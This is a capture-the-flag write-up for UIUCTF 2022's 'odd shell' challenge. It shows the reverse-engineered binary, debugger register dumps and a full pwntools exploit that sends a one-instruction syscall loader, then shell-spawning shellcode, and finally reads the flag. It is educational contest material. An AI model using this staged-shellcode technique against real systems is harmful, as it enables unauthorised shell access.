# odd-shell
This was a shellcoding challenge from UIUCTF 2022. 

[challenge](https://2022.uiuc.tf/challenges#odd%20shell-195)

## description
We were provided with a binary, Dockerfile and jail config. The Dockerfile was largely just for setting up the jail and placing the binary and flag so I'll omit them as they aren't particularly relevant to the solve.

```shell
$ file chal
chal: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cfaf75c6dc9d443a7fe42158387a05d74957d840, for GNU/Linux 3.2.0, not stripped

$ pwn checksec chal 
[*] './chal'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled

```

## reverse engineering
Fire up ghidra and head over to main:
```c
undefined8 main(void)

{
  void *pvVar1;
  long sz;
  long i;
  
  setvbuf(stdout,NULL,2,0);
  setvbuf(stderr,NULL,2,0);
  setvbuf(stdin,NULL,2,0);
  puts("Display your oddities:");
  pvVar1 = mmap((void *)0x123412340000,0x1000,7,0x32,-1,0);
  if (pvVar1 != (void *)0x123412340000) {
    puts("I can\'t allocate memory!");
    exit(-1);
  }
  sz = read(0,(void *)0x123412340000,0x800);
  if (*(char *)(sz + 0x12341233ffff) == '\n') {
    *(undefined *)(sz + 0x12341233ffff) = 0;
    sz = sz + -1;
  }
  i = 0;
  while( true ) {
    if (sz <= i) {
      (*(code *)0x123412340000)();
      return 0;
    }
    // this line
    if ((*(byte *)(i + 0x123412340000) & 1) == 0) break;
    i = i + 1;
  }
  puts("Invalid Character");
  exit(-1);
}
```
Fairly standard shellcode runner with the exception of the line I commented. This line checks that each byte has the low bit set or, in other words is odd: hence all the references to odd-shell and oddities etc.

So we can run shellcode if all the bytes are odd.

## shellcoding
One nice thing I thought immediately is that we get the syscall instruction for free because it's a 64 bit binary and both the instruction bytes are odd:
```python
In [1]: asm('syscall').hex()
Out[1]: '0f05'
```
Assuming we want to pop a shell or cat the flag directly there's some difficulties. We'll likely not get all the bytes in the `/flag` path or `/bin/sh` along with many of the simple instructions. 

We could build our own encoder, likely with some kind of memory write operation for self modifying shellcode. We could also take some standard shellcode and then manually replace instructions with even bytes. Both sound like far too much hard work.

My general approach to any kind of constraint is to ignore whatever I was supposed to be doing and find the minimal constrained payload I can use to get an unconstrained payload. That way I can write simple easy `cat flag` or `pop shell` shellcode. Given the binary already setup an `rwx` page for us in a known location plus we can easily talk to it and we have the `syscall` instruction, all I really need to do is trigger a `read` syscall into the `rwx` page and send a second payload. 

I'll send a `syscall` payload and see how many argument registers we need to change to make it happen:
```shell
0x0000123412340000 in ?? ()

[ REGISTERS ]
 RAX  0x0
 RBX  0x56216a53e330 (__libc_csu_init) ◂— endbr64 
 RCX  0x7fbd66610fd2 (read+18) ◂— cmp    rax, -0x1000 /* 'H=' */
 RDX  0x123412340000 ◂— 0x50f
 RDI  0x0
 RSI  0x123412340000 ◂— 0x50f
 R8   0xffffffff
 R9   0x0
 R10  0x32
 R11  0x246
 R12  0x56216a53e0e0 (_start) ◂— endbr64 
 R13  0x7fff7473a710 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fff7473a620 ◂— 0x0
*RSP  0x7fff7473a5f8 —▸ 0x56216a53e328 (main+351) ◂— mov    eax, 0
*RIP  0x123412340000 ◂— 0x50f
[ DISASM ]

 ► 0x123412340000    syscall  <SYS_read>
        fd: 0x0 (pipe:[4204123])
        buf: 0x123412340000 ◂— 0x50f
        nbytes: 0x123412340000 ◂— 0x50f
   0x123412340002    add    byte ptr [rax], al

```
Our syscall number in `rax` is 0, which is `SYS_read` so we get that for free - nice. arg1 which is `fd` is also 0 which refers to `stdin` so good there too. arg2 or `buf` points at the `rwx` page ... getting suspicious. arg3 or `nbytes` is the page address but `SYS_read` will be happy doing a short read. What else do we need? Nothing. The initial payload is the single instruction `syscall`. Having sent that the binary will be waiting to read a secondary payload into the `rwx` page. The only thing to note is that we need to prepend the secondary payload with 2 bytes which represent the `syscall` instruction we've already run. A whopping 2 bytes.

Put it all together and the now rather simple solver script becomes:

```python
from pwn import *

context.arch = 'amd64'

io = remote('odd-shell.chal.uiuc.tf', 1337)

# send primary payload - padded with an odd byte to max size
io.sendafter(b':\n', flat(asm('syscall'), length=0x800, filler=b'\x01')) 
# send secondary payload at an offset after the syscall instruction
io.send(flat({2: asm(shellcraft.sh())}))

io.interactive()
```

```shell
$ ./solve.py 
[+] Opening connection to odd-shell.chal.uiuc.tf on port 1337:
[*] Switching to interactive mode
$ cat /flag
uiuctf{5uch_0dd_by4t3s_1n_my_r3g1st3rs!}
```

Given the large number of solves during the competition and the possible hint in the flag that things were set up as needed, the challenge author may well have been pointing out that it always pays to check your initial execution context to find the minimal amount of work that needs doing. What's the smallest constrained loader you've written recently?